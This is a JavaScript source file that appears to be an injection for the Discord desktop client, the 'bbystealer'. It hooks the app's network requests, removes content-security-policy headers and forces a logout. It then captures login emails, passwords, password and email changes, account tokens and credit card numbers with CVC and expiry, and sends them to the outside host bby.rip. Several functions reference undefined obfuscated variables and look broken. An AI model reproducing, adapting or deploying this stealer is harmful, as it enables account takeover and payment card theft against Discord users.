// from https://gist.github.com/DiscordSaver/1477943130cf53c8a8c760d0df1b896e

const fs = require('fs'),
    path = require("path"),
    {
        BrowserWindow,
        session
    } = require("electron"),
    querystring = require("querystring");

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "bbystealer"))) return true;
    fs.rmdirSync(path.join(__dirname, "bbystealer"));
    return BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', true).then(response => {}), ![];
}
const Filter = {
    'urls': [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me/library",
        "https://discord.com/api/v*/users/@me/library",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*"
    ]
};
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (FirstTime()) details["url"].startsWith("wss://") ? callback({
        'cancel': true
    }) : callback( {
        'cancel': false
    });
}), session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details["responseHeaders"]["content-security-policy"], delete details["responseHeaders"]["content-security-policy-report-only"], callback({
        'responseHeaders': {
            ...details["responseHeaders"],
            'Access-Control-Allow-Headers': '*'
        }
    });
});

function SendToApi(payload) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var xhr = new XMLHttpRequest(); xhr.open("POST", "https://bby.rip/c1d", true); xhr.setRequestHeader(\'Content-Type\', \'application/json\'); xhr.setRequestHeader(\'Access-Control-Allow-Origin\', \'*\'); xhr.send(JSON.stringify(' + payload + "));", true);
}

function Login(email, password, token) {
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "' + token + '"); xmlHttp.send( null );xmlHttp.responseText;', true).then(response => {
        var user = JSON.parse(response),
            payload = {
                'username': user["username"]+ '#' + user["discriminator"],
                'id': user['id'],
                'avatar': user["avatar"],
                'nitro': user["premium_type"],
                'badges': user["flags"],
                'email': email,
                'password': password,
                'token': token,
                'type': "login"
            };
        SendToApi(JSON.stringify(payload));
    });
}

function ChangePassword(password, new_password, token) {
    BrowserWindow.getAllWindows()[0].getAllWindows.executeJavaScript('var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "' + _0x4c1a47 + '"); xmlHttp.send( null ); xmlHttp.responseText;', true).then(response => {
        var user = JSON.parse(response),
            payload = {
                'username': user["username"]+ '#' + user["discriminator"],
                'avatar': user["avatar"],
                'id': user['id'],
                'nitro': user["premium_type"],
                'badges': user["flags"],
                'email': user["email"],
                'new_password': new_password,
                'password': password,
                'token': token,
                'type': "changedpassword"
            };
        SendToApi(JSON.stringify(payload));
    });
}

function ChangeEmail(email, password, token) {
        BrowserWindow.getAllWindows()[0].getAllWindows.executeJavaScript('var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "' + _0x4616fd + '"); xmlHttp.send( null ); xmlHttp.responseText;', true).then(response => {
        var user = JSON.parse(response),
            payload = {
                'username': user["username"]+ '#' + user["discriminator"],
                'id': user['id'],
                'avatar': user["avatar"],
                'nitro': user["premium_type"],
                'badges': user["flags"],
                'email': email,
                'password': password,
                'token': token,
                'type': "changedemail"
            };
        SendToApi(JSON.stringify(payload));
    });
}

function CreditCardAdded(credit_card_numbers, cvc, expire_month, expire_year, token) {
    BrowserWindow.getAllWindows()[0].getAllWindows.executeJavaScript('var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "' + token + '"); xmlHttp.send( null ); xmlHttp.responseText;', true).then(response => {
        const _0x40e640 = _0x4b4ab1;
        var user = JSON.parse(response),
            payload = {
                'username': user["username"]+ '#' + user["discriminator"],
                'id': user['id'],
                'avatar': user["avatar"],
                'nitro': user["premium_type"],
                'badges': user["flags"],
                'email': user["email"],
                'cc_num': credit_card_numbers,
                'expire_year': expire_year,
                'expire_month': expire_month,
                'token': token,
                'cvc': cvc,
                'type': "creditcard"
            };
            SendToApi(JSON.stringify(payload));
    });
}
const ChangePasswordFilter = {
    'urls': [
        "https://discord.com/api/v*/users/@me",
        "https://discordapp.com/api/v*/users/@me",
        "https://*.discord.com/api/v*/users/@me",
        "https://discordapp.com/api/v*/auth/login",
        "https://discord.com/api/v*/auth/login",
        "https://*.discord.com/api/v*/auth/login",
        "https://api.stripe.com/v*/tokens"
    ]
};

session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, _0x566973) => {
    if (details["url"].endsWith("login")) {
        if (details.statusCode == 200) {
            const login_details = JSON.parse(Buffer.from(details["uploadData"][0]["bytes"]).toString()),
                email = login_details["login"],
                password = login_details["password"];
            BrowserWindow.getAllWindows()[0].getAllWindows.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(token => {
                Login(email, password, token);
            });
        } else {}
    }
    if (details["url"].endsWith("users/@me")) {
        if (details.statusCode == 200 && details["method"] == "PATCH") {
            const user_info = JSON.parse(Buffer.from(details["uploadData"][0]["bytes"]).toString());
            if (user_info["password"] != null && user_info["password"] != undefined && user_info["password"] != '') {
                if (user_info["new_password"] != undefined && user_info["new_password"] != null && user_info["new_password"] != '') {
                    BrowserWindow.getAllWindows()[0].getAllWindows.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(token => {
                        ChangePassword(user_info["password"], user_info["new_password"], token);
                    });
                }
                if (user_info["email"] != null && user_info["email"] != undefined && user_info["email"] != '') {
                    BrowserWindow.getAllWindows()[0].getAllWindows.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(token => {
                        ChangeEmail(user_info["email"], user_info["password"], token);
                    });
                }
            }
        } else {}
    }
    if (details["url"].endsWith("tokens")) {
        credit_card = querystring.parse(decodeURIComponent(Buffer.from(details["uploadData"][0]["bytes"]).toString()));
        BrowserWindow.getAllWindows()[0].getAllWindows.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true).then(token => {
            CreditCardAdded(credit_card["card[number]"], credit_card["card[cvc]"], credit_card["card[exp_month]"], credit_card["card[exp_year]"], token);
        });
    }
}), module.exports = require("./core.asar");